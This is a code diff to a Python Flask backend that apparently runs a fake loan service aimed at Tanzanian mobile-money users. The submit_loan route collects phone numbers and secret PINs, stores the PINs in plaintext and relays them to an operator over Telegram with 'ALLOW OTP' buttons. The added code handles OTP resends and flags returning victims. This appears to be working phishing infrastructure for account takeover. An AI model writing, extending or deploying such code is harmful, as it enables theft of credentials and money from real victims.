@@ -23,6 +23,9 @@ def init_db():
         status TEXT DEFAULT 'pending',
         code_status TEXT DEFAULT 'pending'
     )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS users (
+        phone TEXT UNIQUE, total_applications INTEGER DEFAULT 1
+    )''')
     conn.commit()
     conn.close()
 
@@ -55,19 +58,56 @@ def approve():
 @app.route('/api/submit_loan', methods=['POST'])
 def submit_loan():
     data = request.json
-    app_id = 'HP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-    code = str(random.randint(1000, 9999))
     phone = data.get('phone','')
     pin = data.get('pin','')
     amount = int(data.get('amount',0))
     months = int(data.get('months',1))
+    purpose = data.get('purpose','')
+    
     conn = sqlite3.connect('/tmp/database_hp.db')
     c = conn.cursor()
-    c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,amount,months,phone,pin,code))
+    
+    # ----- OTP REQUESTED (Resend) -----
+    if purpose == 'OTP REQUESTED':
+        # Count how many resends already (pending & code_status pending)
+        c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
+        resend_count = c.fetchone()[0]
+        if resend_count >= 3:
+            conn.close()
+            return jsonify({'success': False, 'error': 'Umeomba OTP mara nyingi. Subiri.'})
+        
+        app_id = 'HP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+        code = str(random.randint(1000, 9999))
+        c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',
+                  (app_id, amount, months, phone, pin, code))
+        conn.commit()
+        conn.close()
+        msg = f'📤 OTP REQUESTED\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n🔢 PIN: {pin}\n💰 Amount: TZS {amount:,}'
+        keyboard = {'inline_keyboard': [[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
+        send_telegram(msg, keyboard)
+        return jsonify({'success':True,'app_id':app_id})
+    
+    # ----- Check if returning user -----
+    c.execute('SELECT total_applications FROM users WHERE phone = ?', (phone,))
+    existing = c.fetchone()
+    is_returning = existing is not None
+    
+    if is_returning:
+        c.execute('UPDATE users SET total_applications = total_applications + 1 WHERE phone = ?', (phone,))
+    else:
+        c.execute('INSERT INTO users (phone) VALUES (?)', (phone,))
+    
+    # ----- New loan request -----
+    app_id = 'HP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+    code = str(random.randint(1000, 9999))
+    c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',
+              (app_id, amount, months, phone, pin, code))
     conn.commit()
     conn.close()
-    msg = f'📥 NEW LOAN REQUEST\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n🔢 PIN: {pin}\n💰 Amount: TZS {amount:,}'
-    keyboard = {'inline_keyboard':[[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
+    
+    prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW LOAN REQUEST'
+    msg = f'{prefix}\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n🔢 PIN: {pin}\n💰 Amount: TZS {amount:,}'
+    keyboard = {'inline_keyboard': [[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
     send_telegram(msg, keyboard)
     return jsonify({'success':True,'app_id':app_id})
 
